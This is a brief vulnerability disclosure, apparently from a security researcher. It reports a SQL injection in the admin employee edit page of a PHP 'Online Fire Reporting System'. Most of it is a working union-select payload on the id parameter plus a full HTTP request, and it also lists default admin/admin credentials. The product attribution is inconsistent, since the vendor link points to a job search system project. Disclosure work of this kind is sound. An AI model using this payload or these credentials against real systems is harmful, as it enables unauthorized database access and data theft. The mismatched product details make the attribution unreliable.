# Online Fire Reporting System v1.0  has SQL injection

The password for the backend login account is: admin/admin

vendors: https://www.campcodes.com/projects/php/online-job-search-system-using-php-mysql-free-download/

Vulnerability File: /eris/admin/employee/index.php?view=edit&id=

Vulnerability location: /eris/admin/employee/index.php?view=edit&id=,id

Current database name: erisdb

[+] Payload: /eris/admin/employee/index.php?view=edit&id=-2018001%27%20union%20select%201,2,database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--+ // Leak place ---> id

```sql
GET /eris/admin/employee/index.php?view=edit&id=-2018001%27%20union%20select%201,2,database(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=mho0fs263l0tis8l6v3lqpu6q4
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/170849129-04da1989-84f1-4cf0-b785-e7e0c0812995.png)

![image](https://user-images.githubusercontent.com/54017627/170849125-542c71ad-f9d0-4227-b190-144a72c8a07b.png)
